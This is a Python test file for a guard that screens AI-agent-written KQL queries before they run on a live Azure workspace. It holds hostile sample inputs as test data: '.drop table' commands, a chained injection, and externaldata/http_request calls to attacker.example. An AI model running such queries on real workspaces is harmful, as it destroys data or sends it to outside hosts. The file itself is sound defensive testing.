"""
The guard is the only thing between a model-written query and a live workspace,
so its rejections are tested explicitly rather than assumed.
"""

from app.agent.kql_guard import MAX_ROWS, MAX_TIMESPAN_HOURS, validate_kql


def test_allows_a_normal_read_query():
    r = validate_kql("AzureActivity | where Caller == 'x' | take 10", 24)
    assert r.ok
    assert r.timespan_hours == 24


def test_rejects_control_commands():
    for q in [".drop table AzureActivity", ".create table Foo (a:string)", ".set-or-append Bar <| X"]:
        r = validate_kql(q)
        assert not r.ok, f"control command was allowed: {q}"
        assert "control command" in r.reason


def test_rejects_external_data_and_outbound_calls():
    for q, _ in [
        ("externaldata(x:string) [@'https://attacker.example/x.csv']", "externaldata"),
        ("evaluate http_request('https://attacker.example')", "http_request"),
        ("cluster('other').database('d').Table", "cluster"),
    ]:
        r = validate_kql(q)
        assert not r.ok, f"forbidden construct was allowed: {q}"


def test_rejects_statement_chaining():
    r = validate_kql("AzureActivity | take 1; .drop table AzureActivity")
    assert not r.ok
    # Either the chaining check or the control-command check may catch it first;
    # both are correct outcomes.
    assert r.reason


def test_allows_let_bindings():
    r = validate_kql("let win = 1h; AzureActivity | where TimeGenerated > ago(win) | take 5")
    assert r.ok, r.reason


def test_applies_a_row_cap_when_the_query_is_unbounded():
    r = validate_kql("AzureActivity | where Caller == 'x'")
    assert r.ok
    assert f"| take {MAX_ROWS}" in r.query
    assert any("row cap" in n for n in r.notes)


def test_does_not_double_cap_a_bounded_query():
    r = validate_kql("AzureActivity | summarize count() by Caller")
    assert r.ok
    assert "take" not in r.query.lower()


def test_clamps_an_excessive_timespan():
    r = validate_kql("AzureActivity | take 5", 10_000)
    assert r.ok
    assert r.timespan_hours == MAX_TIMESPAN_HOURS
    assert any("clamped" in n for n in r.notes)


def test_rejects_empty_and_oversized_queries():
    assert not validate_kql("", 24).ok
    assert not validate_kql("A" * 5000, 24).ok
